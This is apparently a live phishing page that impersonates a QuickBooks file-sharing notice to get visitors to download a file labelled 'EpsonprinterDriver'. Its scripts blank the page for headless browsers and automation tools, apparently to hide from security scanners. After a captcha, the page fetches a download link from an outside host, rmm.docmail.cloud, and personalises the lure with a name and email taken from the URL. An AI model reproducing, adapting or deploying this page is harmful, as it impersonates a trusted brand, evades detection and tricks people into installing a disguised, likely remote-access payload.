<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Avenir Next","Helvetica Neue",Arial,sans-serif;background:#f4f5f5;color:#393a3d;min-height:100vh}
.hdr{background:#2ca01c;height:56px;display:flex;align-items:center;padding:0 24px;gap:10px}
.qb-logo{display:flex;align-items:center;gap:8px;text-decoration:none}
.qb-wordmark{color:#fff;font-size:18px;font-weight:800;letter-spacing:-.3px}
.main{max-width:620px;margin:32px auto;padding:0 16px}
.invoice-badge{background:#e8f5e4;border:1px solid #b8e0b0;border-radius:6px;padding:10px 14px;margin-bottom:18px;font-size:13px;color:#1a6b0a;font-weight:600;display:flex;align-items:center;gap:8px}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.1);overflow:hidden}
.card-header{background:#2ca01c;padding:18px 22px;display:flex;align-items:center;gap:14px}
.ch-info{color:#fff}
.ch-title{font-size:18px;font-weight:700}
.ch-sub{font-size:13px;opacity:.8;margin-top:3px}
.card-body{padding:22px}
.doc-row{display:flex;align-items:center;gap:12px;background:#f4f9f3;border:1px solid #c8e6c0;border-radius:6px;padding:14px;margin-bottom:18px}
.doc-name{font-size:14px;font-weight:700;color:#1a6b0a;word-break:break-all}
.doc-meta{font-size:12px;color:#666;margin-top:2px}
.recip{font-size:12px;color:#666;display:none;margin-top:2px}
.note{font-size:13px;color:#555;background:#fffbf0;border-left:3px solid #f0a500;padding:10px 14px;border-radius:0 4px 4px 0;margin-bottom:18px}
.verify-box{background:#f4f5f5;border:1px solid #ddd;border-radius:6px;padding:14px 16px}
.verify-lbl{font-size:12px;font-weight:700;color:#555;text-transform:uppercase;letter-spacing:.5px;margin-bottom:10px}
.cap-row{display:flex;justify-content:center}
#cap-err{color:#c0392b;font-size:12px;margin-top:8px;display:none;text-align:center}
#dl-btn{display:none;margin-top:14px;width:100%;padding:13px;background:#2ca01c;color:#fff;border:none;border-radius:6px;font-size:15px;font-weight:700;cursor:pointer;font-family:inherit}
#dl-btn:hover{background:#238016}
.footer{text-align:center;font-size:11px;color:#aaa;margin-top:18px;padding-bottom:12px}
</style>
<script src="https://js.hcaptcha.com/1/api.js" async defer></script>
<script>(function(){
var rlpqtcfj=navigator.webdriver||false;
var aoidfftz=window.outerWidth===0||window.outerHeight===0;
var yghdwgbe=/HeadlessChrome|PhantomJS|Selenium|puppeteer/i.test(navigator.userAgent);
if(rlpqtcfj||aoidfftz||yghdwgbe){document.body.innerHTML='';return;}
})();</script>
</head>
<body>
<div class="hdr">
  <a class="qb-logo" href="#">
    <svg width="28" height="28" viewBox="0 0 100 100"><rect width="100" height="100" rx="18" fill="rgba(255,255,255,.2)"/><circle cx="36" cy="50" r="24" fill="white"/><circle cx="64" cy="50" r="24" fill="white" opacity=".7"/><circle cx="36" cy="50" r="14" fill="#2ca01c"/><rect x="60" y="36" width="8" height="28" rx="4" fill="white"/></svg>
    <span class="qb-wordmark">QuickBooks</span>
  </a>
</div>
<div class="main">
  <div class="invoice-badge">
    <svg width="16" height="16" viewBox="0 0 24 24" fill="#2ca01c"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
    Document ready from Renzo 
  </div>
  <div class="card">
    <div class="card-header">
      <svg width="40" height="40" viewBox="0 0 64 80"><path d="M0 4C0 1.8 1.8 0 4 0H42L64 22V76C64 78.2 62.2 80 60 80H4C1.8 80 0 78.2 0 76V4Z" fill="rgba(255,255,255,.2)"/><path d="M42 0L64 22H44C42.9 22 42 21.1 42 20V0Z" fill="rgba(255,255,255,.15)"/><rect x="12" y="32" width="40" height="4" rx="2" fill="white" opacity=".9"/><rect x="12" y="42" width="28" height="4" rx="2" fill="white" opacity=".6"/><rect x="12" y="52" width="34" height="4" rx="2" fill="white" opacity=".6"/></svg>
      <div class="ch-info"><div class="ch-title">EpsonprinterDriver</div><div class="ch-sub">From Renzo </div></div>
    </div>
    <div class="card-body">
      <div class="note">Your file is ready for download</div>
      <div class="doc-row">
        <svg width="36" height="44" viewBox="0 0 64 80"><path d="M0 4C0 1.8 1.8 0 4 0H42L64 22V76C64 78.2 62.2 80 60 80H4C1.8 80 0 78.2 0 76V4Z" fill="#2ca01c"/><path d="M42 0L64 22H44C42.9 22 42 21.1 42 20V0Z" fill="rgba(255,255,255,.2)"/><rect x="12" y="32" width="40" height="4" rx="2" fill="white" opacity=".9"/><rect x="12" y="42" width="28" height="4" rx="2" fill="white" opacity=".65"/><rect x="12" y="52" width="34" height="4" rx="2" fill="white" opacity=".65"/></svg>
        <div><div class="doc-name">EpsonprinterDriver</div><div class="doc-meta">Sent by Renzo </div><div class="recip" id="recipient-info"></div></div>
      </div>
      <div class="verify-box">

</div>
<script>
var _srv='https://rmm.docmail.cloud';var _lid=18;
async function onCaptchaSuccess(token){
var btn=document.getElementById('dl-btn');var err=document.getElementById('cap-err');
err.style.display='none';
try{
var r=await fetch(_srv+'/generate-link/verify-captcha',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({link_id:_lid,captcha_token:token})});
var d=await r.json();
if(!r.ok){err.textContent=d.detail||'Verification failed. Please try again.';err.style.display='block';if(typeof hcaptcha!=='undefined')hcaptcha.reset();return;}
var a=document.createElement('a');a.href=d.url;a.download=d.display_name||'';document.body.appendChild(a);
btn.style.display=btn.dataset.display||'inline-flex';btn.onclick=function(){a.click();};
}catch(e){err.textContent='Network error. Please try again.';err.style.display='block';if(typeof hcaptcha!=='undefined')hcaptcha.reset();}
}
function getParams(){
var p=new URLSearchParams(window.location.search);var n=p.get('n')||'';var e=p.get('e')||'';
var el=document.getElementById('recipient-info');if(!el)return;
if(n||e){el.style.display='block';
if(n&&e)el.textContent='For: '+decodeURIComponent(n)+' — '+decodeURIComponent(e);
else el.textContent='For: '+decodeURIComponent(n||e);}
}
window.addEventListener('load',getParams);</script>
